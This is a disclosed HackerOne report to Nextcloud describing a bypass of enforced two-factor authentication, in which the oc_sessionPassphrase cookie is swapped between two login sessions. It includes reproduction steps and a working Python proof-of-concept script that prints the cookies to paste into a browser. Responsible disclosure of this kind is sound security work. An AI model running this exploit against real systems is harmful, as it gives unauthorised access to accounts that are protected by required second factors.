# Two-factor authentication enforcement bypass

## Report Details
- **Report ID**: 1050244
- **URL**: https://hackerone.com/reports/1050244
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-12-04T01:07:56.574Z
- **Disclosed**: 2021-07-31T14:05:14.810Z

## Reporter
- **Username**: abdullah-a
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
the attacker could bypass the two-factor authentication enforcement

[ Steps to reproduce ]
1. Login with an Administrator account.
2. Click on your administrator profile icon.
3. Users -> Add group -> group name: Enforcement.
4. New User -> Username: Bypass -> Password: NextCloudEnforcement -> Add User in group -> Enforcement.
5. Click on your administrator profile icon.
6. Settings -> Administration label -> Security -> Two-Factor Authentication -> Enforcement of two-factor authentication can be set for certain groups only. Two-factor authentication is enforced for all members of the following groups. -> Add Enforcement group.
7. Save changes.
8. Logout.
9. Login with Username: Bypass and Password: NextCloudEnforcement the response msg is Two-factor authentication is enforced but has not been configured on your account. Contact your admin for assistance.
10. Login with Username: Bypass and Password: NextCloudEnforcement with another session.
11. replace the oc_sessionPassphrase token with the first oc_sessionPassphrase session.
12. then you have bypassed the two factor authentication enforcement.

[Code]
python script just change the domain to your domain and save as bypass.py
```
#!/usr/bin/python3
# python3 -m pip install requests beautifulsoup4
# python3 bypass.py
from requests import Session
from bs4 import BeautifulSoup

class NextCloud(object):
    def __init__(self, baseURL):
        self.session = Session()
        self.baseURL = baseURL

    def login(self, data):
        response = self.session.get(f'{self.baseURL}/login')
        soup = BeautifulSoup(response.text, 'html.parser')
        data.update({
            'requesttoken': soup.find('head')['data-requesttoken']
        })
        self.session.post(f'{self.baseURL}/login', data = data)
    
    def getCookies(self):
        return self.session.cookies.get_dict()

if __name__ == '__main__':
    baseURL = 'http://nextcloud.diefunction.local'
    data = {
        'user': 'bypass',
        'password': 'NextCloudEnforcement'
    }
    firstSession = NextCloud(baseURL)
    secondSession = NextCloud(baseURL)
    firstSession.login(data)
    secondSession.login(data)
    cookies = firstSession.getCookies()
    cookies['oc_sessionPassphrase'] = secondSession.getCookies()['oc_sessionPassphrase']
    print(f'[Cookies] {cookies}') # change your browser cookies to bypass enforcement
```
change the browser cookies to the script output cookies

[ why its worked ]
I tried to understand why it's worked but I didn't found any reason for that
https://github.com/nextcloud/server/blob/1762a409f954fd9a66e7572704ea9ba7813601b4/core/templates/twofactorselectchallenge.php

[Discovered by]
Abdullah Alharbi @Eng_Abdullahx0
Rayan Althobaiti @Diefunction

Note: if this is an eligible bug please provide a CVE.

## Impact

the attacker can gain access to the user dashboard if the user account is enforced with two-factor authentication

## Attachments
- NextCloud_Enforcement_Bypass.mp4
